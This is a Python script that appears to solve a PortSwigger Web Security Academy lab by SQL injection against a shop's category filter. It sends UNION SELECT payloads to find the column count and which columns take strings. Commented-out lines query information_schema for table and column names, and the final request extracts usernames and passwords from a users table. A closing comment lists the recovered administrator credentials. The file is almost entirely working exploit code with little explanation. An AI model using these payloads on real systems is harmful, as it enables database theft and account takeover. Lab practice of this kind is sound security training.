#!/usr/bin/env python3

import requests

url = "https://0a36008303eea5cf80a7357f004e00d8.web-security-academy.net/filter"
params = {"category": "Tech gifts' UNION SELECT NULL, NULL--"}

response = requests.get(url, params=params)

print(response.status_code)

# now that we know Gifts contains three columns, let's test which is compatible
# with String data type
for i in range(2):
    stmt = ["NULL"] * 2
    stmt[i] = "'string-compatible'"

    params = {"category": f"Tech gifts' UNION SELECT {','.join(stmt)}--"}

    response = requests.get(url, params=params)

    if response.status_code == requests.codes.ok:
        print(f"the position which is 'string-compatible' is {i+1}")


# now we know that Gifts contains two columns which are both string compatible
# from the lab description, we know there exist a different table `users`

# the following determines the names of the tables
# params = {"category": "Tech gifts' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables--"}

# the following determines the columns in the table
# params = {
#     "category": "Tech gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE TABLE_NAME = 'users_eeqvqh'--"
# }

# this one is the real thing~
params = {
    "category": "Tech gifts' UNION SELECT username_gdslsw, password_ommkgp FROM users_eeqvqh--"
}

response = requests.get(url, params=params)

print(f"Your final request status code is {response.status_code}")
print(f"Your final request {response.url}")

# credentials are
# username=administrator, password=kr8dxtil1m5lf31xkawk



